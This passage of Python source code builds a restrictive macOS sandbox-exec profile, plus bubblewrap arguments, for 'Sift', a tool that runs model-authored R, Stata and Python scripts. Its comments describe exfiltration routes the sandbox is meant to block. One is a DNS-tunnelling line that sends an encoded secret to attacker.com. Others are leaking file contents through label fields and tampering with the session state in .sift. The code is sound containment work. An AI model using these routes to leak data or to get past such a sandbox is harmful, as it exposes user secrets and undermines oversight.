    # without recursing into mounts nested beneath it (per bwrap's own
    # ``--help`` text), so applying it to ``/`` as the LAST setup step
    # — after every ``--bind``/``--ro-bind``/``--tmpfs`` above — locks
    # every path that was never explicitly (and deliberately) made
    # writable, while leaving the real writable mounts (``cwd``,
    # ``run_dir``, and the ``.sift`` tmpfs) untouched, since each of
    # those is its own separate mount entry. Verified empirically: an
    # unbound path write fails with ``EROFS`` after this flag, while
    # writes to ``cwd``/``run_dir`` and the ``.sift`` masking/carve-out
    # behaviour all continue to work exactly as before.
    args.extend(["--remount-ro", "/"])

    return args


def _sandbox_profile_string(
    run_dir: Path, cwd: Path, home: Path | None = None,
    extra_read_paths: tuple[str, ...] = (),
) -> str:
    """Build the SBPL profile text. Pure function — no I/O.

    Split from ``_write_sandbox_profile`` so unit tests can inspect the
    generated profile without needing sandbox-exec to be callable in
    the test environment. See ``test_executor_profile.py`` for the
    invariants the profile must satisfy.

    ``extra_read_paths`` is for runtimes whose interpreter lives
    outside the system trees the default profile already covers
    (e.g. a venv'd Python). Each entry is added as a read-subpath.
    """
    return _build_profile(
        run_dir, cwd, home or Path.home(), extra_read_paths,
    )


def _write_sandbox_profile(
    run_dir: Path, cwd: Path,
    extra_read_paths: tuple[str, ...] = (),
) -> Path:
    """Write a per-run sandbox-exec profile and return its path.

    Uses a ``(deny default)`` posture with explicit allowlists, so that
    a script spawned under the profile can read:

    - Narrow system and library trees needed by R/Stata to load their own
      code, plus the selected runtime's canonical installation root.
    - The user's R package library under ``~/Library/R`` and Stata's
      user config under ``~/Library/Application Support/Stata`` plus
      the conventional ``~/ado`` adopath.
    - The researcher's working directory ``cwd`` — where data files
      live — and the scratch ``run_dir`` for the current invocation.

    and write only to:

    - The scratch ``run_dir`` (where ``SIFT_RESULT_PATH`` lives and
      where Stata drops its batch ``.log``).
    - Console device files (``/dev/null``, ``/dev/tty``, a pty) that
      shells / subprocess plumbing write to.

    Everything else — including the rest of the user's home dir, so
    ``~/.ssh``, ``~/.aws``, ``~/.gnupg``, Keychains — is denied.
    Network is denied entirely.

    This profile is the load-bearing enforcement of the data-boundary
    story. Without it, a malicious script could read arbitrary files
    and smuggle their contents out through ``label`` / coefficient-name
    fields in the result payload; with it, the script can only see
    ``cwd``, and the runtime-library-only I/O convention plus the
    sanitizer allowlist become the only paths to Claude's context.

    Notes on specific SBPL details:

    - ``(literal "/")`` is required in addition to the child subpaths
      because some metadata reads land on ``/`` itself (``stat("/")``)
      and a subpath of a child dir does not cover the parent.
    - ``file-read-metadata`` is allowed globally: ``stat()`` on paths
      outside the read allowlist is still permitted, which R/Stata's
      library-loading code paths rely on when probing for files. Only
      reading *contents* (``file-read-data``, open-for-read) is
      restricted.
    - The ``/dev/ttys*`` regex covers pseudo-terminals that subprocess
      pipes may briefly touch.
    """
    profile = _build_profile(run_dir, cwd, Path.home(), extra_read_paths)
    path = run_dir / "sandbox.sb"
    path.write_text(profile, encoding="utf-8")
    return path


def _build_profile(
    run_dir: Path, cwd: Path, home: Path,
    extra_read_paths: tuple[str, ...] = (),
) -> str:
    """Construct the SBPL text. Separated so it can be unit-tested
    without filesystem I/O (see ``_sandbox_profile_string``).
    """
    r_user_lib = home / "Library" / "R"
    stata_user_config = home / "Library" / "Application Support" / "Stata"
    stata_user_ado = home / "ado"

    def _quote(p: Path | str) -> str:
        """Quote a path as an SBPL string literal.

        SBPL string literals are double-quoted with ``\\`` / ``"``
        escaping. Paths that contain either are extremely rare on macOS
        but we escape defensively so the profile can't be broken (or
        widened) by an unusual cwd.
        """
        s = str(p)
        return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'

    # Per-run write scope: the run's scratch dir (result file, Stata
    # .log, staged script, and run_dir/tmp via TMPDIR override), and
    # the researcher's cwd (so scripts can ``save "panel.dta", replace``
    # / ``saveRDS`` / ``df.to_csv``).
    #
    # The researcher's cwd is the analysis workspace. Every session
    # gets its own dir under ``~/.sift-sessions/`` so a script writing
    # there cannot reach personal files. The data-boundary the
    # sandbox enforces is the *network deny* and the *read* allowlist
    # (so a script can't slurp ``/etc/passwd`` or POST data to a
    # remote host); writes within the user-authorized cwd are part of
    # the normal Stata / R / Python workflow.
    #
    # NOT in this list (deliberately): /private/tmp, /private/var/folders,
    # /tmp. Those system temp roots hold scratch files from every
    # other app the same user is running (Slack, Cursor, Chrome
    # caches). Granting read+write subpath there let a script grep
    # cross-app secrets and smuggle excerpts back through any
    # surviving channel (helper labels, etc.). The executor instead
    # sets TMPDIR=<run_dir>/tmp for the subprocess, so R / Stata /
    # Python's tempfile module land scratch files inside the
    # run-dir allow.
    write_subpaths = [
        _quote(run_dir),
        _quote(cwd),
    ]
    write_literals = [
        _quote("/dev/null"),
        _quote("/dev/dtracehelper"),
        _quote("/dev/tty"),
    ]

    # Narrow /private/etc reads to the specific config files R/Stata
    # actually need. The previous `(subpath "/private/etc")` re-opened
    # reads on /etc/passwd (user GECOS, home dirs, shells), /etc/group,
    # /etc/sudoers.d, etc. — all of which a malicious script could
    # exfiltrate character-by-character through sanitizer-allowed label
    # fields. This list is an empirical starting point; expand if a
    # future R/Stata version probes another config file at startup.
    read_literals = [
        _quote("/private/etc/hosts"),
        _quote("/private/etc/localtime"),
        _quote("/private/etc/resolv.conf"),
        _quote("/private/etc/protocols"),
        _quote("/private/etc/services"),
        _quote("/private/etc/nsswitch.conf"),
        # Stata-MP (Stata 19 / StataNow) links LibreSSL and performs
        # OpenSSL config init at startup. If `openssl.cnf` is unreadable
        # LibreSSL aborts with "Auto configuration failed" and Stata
        # exits 1 before opening its batch log, so even `display "hi"`
        # dies in ~0.06s with no diagnostic surfaced to the researcher.
        # The cert bundle (`cert.pem`) is deliberately NOT allowed:
        # `(deny network*)` blocks outbound TLS anyway, so a script
        # can't reach a verifier even if it loaded the bundle.
        _quote("/private/etc/ssl/openssl.cnf"),
    ]

    # Per-run read scope: system trees needed by R/Stata to bootstrap
    # themselves, plus the researcher's cwd (data) and the runtime
    # staging dir.
    #
    # The top-level dirs are deliberately NOT allowed as whole
    # subtrees. `/private` in particular would re-open reads on
    # `/private/var/log`, `/private/var/backups`, and other sensitive
    # subpaths that R/Stata don't need. `/Library` similarly contains
    # `/Library/Keychains` and `/Library/LaunchDaemons`. Each child is
    # listed explicitly so the boundary is "researcher cwd + runtime
    # dirs + only the system subpaths the interpreter actually needs."
    #
    # Everything under $HOME *except* the explicit R/Stata user
    # subpaths is denied, which is the whole point of the boundary.
    read_subpaths = [
        _quote("/System"),
        # /Library — only the subtrees R / Stata / Rosetta reach into.
        _quote("/Library/Apple"),
        _quote("/Library/Application Support/Stata"),
        _quote("/Library/Frameworks"),
        # /usr — skip /usr/sbin (R/Stata don't use privileged tools).
        _quote("/usr/bin"),
        _quote("/usr/lib"),
        _quote("/usr/libexec"),
        # Traditional /usr/local runtimes. Package-manager or custom roots
        # outside these common binary/library/share trees are granted only
        # through the selected Tool.extra_read_paths below.
        _quote("/usr/local/bin"),
        _quote("/usr/local/lib"),
        _quote("/usr/local/share"),
        _quote("/usr/share"),
        _quote("/bin"),
        _quote("/sbin"),
        _quote("/dev"),
        # /private — only the subtrees needed for POSIX config,
        # user/group resolution, and timezone data. Notably: /private/etc
        # is NOT a subpath — specific config files are allowed via
        # read_literals above. See the comment on that list for why.
        #
        # NOT in this list (deliberately): /private/tmp,
        # /private/var/folders. Those trees contain scratch files
        # from every app the same user is running — granting read
        # subpath there let a model-authored script enumerate other
        # apps' caches / session tokens / draft documents. The
        # executor sets TMPDIR=<run_dir>/tmp for the subprocess so
        # R / Stata / Python's tempfile module lands inside the
        # run_dir allow without needing the broad temp roots.
        _quote("/private/var/db/dslocal"),
        _quote("/private/var/db/timezone"),
        _quote(r_user_lib),
        _quote(stata_user_config),
        _quote(stata_user_ado),
        _quote(cwd),
        _quote(run_dir),
    ]
    # Per-language extras (typically a Python interpreter's sys.prefix
    # so it can read its own stdlib + site-packages). Only added when
    # the executor is running a language that needs them; absent for
    # R / Stata runs.
    for p in extra_read_paths:
        if p and Path(p).is_absolute():
            read_subpaths.append(_quote(p))

    # Carve ``.sift`` out of the cwd allow. The cwd allow gives scripts
    # the analysis workspace, but ``<cwd>/.sift`` holds Sift's own
    # session state — chat_history.jsonl, results.db, prior run scripts
    # and stdout/stderr logs, helper plot manifests. Those files are
    # exactly the raw / pre-sanitization material the tool layer keeps
    # out of model-visible context. A model-authored script left to
    # roam under ``<cwd>/.sift`` could read them and smuggle excerpts
    # back through any sanitizer-allowed channel (label fields, helper
    # error bodies, even an unsanitized stdout line on a non-result
    # path), or corrupt the persisted session state to influence
    # future turns.
    #
    # SBPL rule precedence is "last match wins", so we re-emit the
    # allow for cwd, follow it with a deny for ``<cwd>/.sift``, and
    # finish with a re-allow for the current ``run_dir`` (which IS
    # under ``<cwd>/.sift/runs/<id>/`` — the script needs to read
    # its staged runtime library and write its result.json there).
    # Anything else under ``.sift`` falls through to the deny.
    sift_dir = cwd / ".sift"
    return (
        "(version 1)\n"
        "(deny default)\n"
        "\n"
        "; Network — load-bearing. Scripts cannot exfiltrate data off-box.\n"
        "(deny network*)\n"
        "\n"
        "; Process / IPC / signal operations R and Stata expect.\n"
        "(allow process*)\n"
        "(allow mach*)\n"
        "(allow iokit*)\n"
        "(allow sysctl*)\n"
        "(allow ipc-posix*)\n"
        "(allow signal)\n"
        "\n"
        "; Close the Mach-IPC bridge to system daemons that perform\n"
        "; network I/O on the caller's behalf. ``(deny network*)``\n"
        "; alone is insufficient: macOS's ``getaddrinfo()`` /\n"
        "; ``res_query()`` route DNS lookups through mDNSResponder,\n"
        "; which runs OUTSIDE this sandbox and issues the actual UDP\n"
        "; packets. A script that does\n"
        ";   getaddrinfo(\"<base32-encoded-secret>.attacker.com\")\n"
        "; never touches the network from its own process — the\n"
        "; ``(deny network*)`` rule above doesn't fire — but the\n"
        "; encoded subdomain still reaches the attacker's nameserver.\n"
        ";\n"
        "; SBPL evaluates rules in declaration order with last-match-\n"
        "; wins, so these denies override the (allow mach*) above for\n"
        "; the specific global-names. R and Stata don't need to talk\n"
        "; to these daemons at script-time; ``install_packages`` runs\n"
        "; outside the sandbox where it has full network and mach\n"
        "; access. The list isn't claimed to be exhaustive — other\n"
        "; system services may also bridge to the network — but it\n"
        "; closes the canonical mDNSResponder bypass.\n"
        "(deny mach-lookup\n"
        "    (global-name \"com.apple.mDNSResponder\")\n"
        "    (global-name \"com.apple.mDNSResponderHelper\")\n"
        "    (global-name \"com.apple.dnsextensiond\")\n"
        "    (global-name \"com.apple.networkserviceproxy\")\n"
        "    (global-name \"com.apple.nehelper\")\n"
        "    (global-name \"com.apple.nesessionmanager\")\n"
        "    (global-name \"com.apple.network.statistics\")\n"
        "    (global-name \"com.apple.SystemConfiguration.PPPController\")\n"
        "    (global-name \"com.apple.SystemConfiguration.SCNetworkReachability\")\n"
        "    (global-name \"com.apple.coreservices.launchservicesd\")\n"
        "    (global-name \"com.apple.lsd.mapdb\")\n"
        "    (global-name \"com.apple.lsd.modifydb\")\n"
        "    (global-name \"com.apple.lsd.open\")\n"
        "    (global-name \"com.apple.sharingd\")\n"
        "    (global-name \"com.apple.sharekit\")\n"
        "    (global-name \"com.apple.imagent\")\n"
        "    (global-name \"com.apple.shortcuts.events\"))\n"
        "; Prevent clipboard and drag/drop pasteboard IPC. A script can\n"
        "; otherwise read confidential material copied by another app or\n"
        "; place data where an unsandboxed app later transmits it.\n"
        "(deny mach-lookup\n"
        "    (global-name-regex #\"^com\\.apple\\.pasteboard(\\..*)?$\"))\n"
        "; Do not let headless scripts ask GUI applications to act for them.\n"
        "(deny appleevent-send)\n"
        "\n"
        "; stat() is allowed anywhere — only reading file *contents* is\n"
        "; restricted below. R/Stata probe many paths during startup.\n"
        "(allow file-read-metadata)\n"
        "\n"
        "; File-content reads: system trees, user R/Stata config, and\n"
        "; the researcher's cwd. Everything else (including the rest\n"
        "; of the home dir) is implicitly denied.\n"
        "(allow file-read*\n"
        "    (literal \"/\")\n"
        + "".join(f"    (literal {p})\n" for p in read_literals)
        + "".join(f"    (subpath {p})\n" for p in read_subpaths)
        + ")\n"
        "\n"
        "; Carve ``.sift`` out of the cwd read allow — Sift's session\n"
        "; state (chat_history.jsonl, results.db, prior run logs) must\n"
        "; never be readable by a script. Re-allow only the current\n"
        "; run_dir below so the runtime library + result.json still\n"
        "; resolve.\n"
        f"(deny file-read* (subpath {_quote(sift_dir)}))\n"
        f"(allow file-read* (subpath {_quote(run_dir)}))\n"
        "\n"
        "; File writes restricted to the run's scratch dir and temp\n"
        "; paths used by R/Stata for internal staging.\n"
        "(allow file-write*\n"
        + "".join(f"    (subpath {p})\n" for p in write_subpaths)
        + "".join(f"    (literal {p})\n" for p in write_literals)
        + "    (regex #\"^/dev/ttys[0-9]+$\"))\n"
        "\n"
        "; Same carve-out on writes: a script must not modify Sift's\n"
        "; session state (which would let it influence future turns by\n"
        "; tampering with results.db / chat_history.jsonl). Re-allow\n"
        "; only the current run_dir so result.json + stdout/stderr\n"
        "; logs land where the executor reads them.\n"
        f"(deny file-write* (subpath {_quote(sift_dir)}))\n"
        f"(allow file-write* (subpath {_quote(run_dir)}))\n"
    )
